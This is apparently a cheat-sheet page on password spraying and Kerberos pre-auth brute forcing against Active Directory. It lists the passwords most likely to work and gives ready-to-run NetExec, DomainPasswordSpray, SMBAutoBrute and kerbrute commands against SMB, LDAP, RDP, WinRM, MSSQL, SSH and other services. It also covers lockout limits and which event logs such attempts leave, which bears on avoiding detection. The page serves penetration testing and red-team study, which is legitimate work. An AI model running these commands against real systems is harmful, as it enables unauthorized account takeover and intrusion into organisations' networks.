# Password - Spraying

Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password. 

> The builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates. 

Most of the time the best passwords to spray are :

- Passwords: `P@ssw0rd01`, `Password123`, `Password1`,
- Common password: `Welcome1`/`Welcome01`, `Hello123`, `mimikatz`
- $Companyname1:`$Microsoft1`
- SeasonYear: `Winter2019*`, `Spring2020!`, `Summer2018?`, `Summer2020`, `July2020!`
- Default AD password with simple mutations such as number-1, special character iteration (`*`,`?`,`!`,`#`)
- Empty Password: NT hash is `31d6cfe0d16ae931b73c59d7e0c089c0`

:warning: be careful with the account lockout !


## Spray a pre-generated passwords list

* Using [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)
  ```powershell
  nxc smb 10.0.0.1 -u /path/to/users.txt -p Password123
  nxc smb 10.0.0.1 -u Administrator -p /path/to/passwords.txt
  
  nxc smb targets.txt -u Administrator -p Password123 -d domain.local
  nxc ldap targets.txt -u Administrator -p Password123 -d domain.local
  nxc rdp targets.txt -u Administrator -p Password123 -d domain.local
  nxc winrm targets.txt -u Administrator -p Password123 -d domain.local
  nxc mssql targets.txt -u Administrator -p Password123 -d domain.local
  nxc wmi targets.txt -u Administrator -p Password123 -d domain.local

  nxc ssh targets.txt -u Administrator -p Password123
  nxc vnc targets.txt -u Administrator -p Password123
  nxc ftp targets.txt -u Administrator -p Password123
  nxc nfs targets.txt -u Administrator -p Password123
  ```

* Using [hashcat/maskprocessor](https://github.com/hashcat/maskprocessor) to generate passwords following a specific rule
  ```powershell
  nxc smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
  ```

* Using [dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) to spray a password against all users of a domain.
  ```powershell
  Invoke-DomainPasswordSpray -Password Summer2021!
  Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
  ```

* Using [shellntel-acct/scripts/SMBAutoBrute](https://github.com/shellntel-acct/scripts/blob/master/Invoke-SMBAutoBrute.ps1).
  ```powershell
  Invoke-SMBAutoBrute -PasswordList "jennifer, yankees" -LockoutThreshold 3
  Invoke-SMBAutoBrute -UserList "C:\ProgramData\admins.txt" -PasswordList "Password1, Welcome1, 1qazXDR%+" -LockoutThreshold 5 -ShowVerbose
  ```


## BadPwdCount attribute

> The number of times the user tried to log on to the account using an incorrect password. A value of `0` indicates that the value is unknown.

```powershell
$ netexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --users
LDAP        10.0.2.11       389    dc01       Guest      badpwdcount: 0 pwdLastSet: <never>
LDAP        10.0.2.11       389    dc01       krbtgt     badpwdcount: 0 pwdLastSet: <never>
```


## Kerberos pre-auth bruteforcing

Using [ropnop/kerbrute](https://github.com/ropnop/kerbrute), a tool to perform Kerberos pre-auth bruteforcing.

> Kerberos pre-authentication errors are not logged in Active Directory with a normal **Logon failure event (4625)**, but rather with specific logs to **Kerberos pre-authentication failure (4771)**.

* Username bruteforce
  ```powershell
  ./kerbrute_linux_amd64 userenum -d domain.local --dc 10.10.10.10 usernames.txt
  ```
* Password bruteforce
  ```powershell
  ./kerbrute_linux_amd64 bruteuser -d domain.local --dc 10.10.10.10 rockyou.txt username
  ```
* Password spray
  ```powershell
  ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt Password123
  ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt rockyou.txt
  ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt '123456' -v --delay 100 -o kerbrute-passwordspray-123456.log
  ```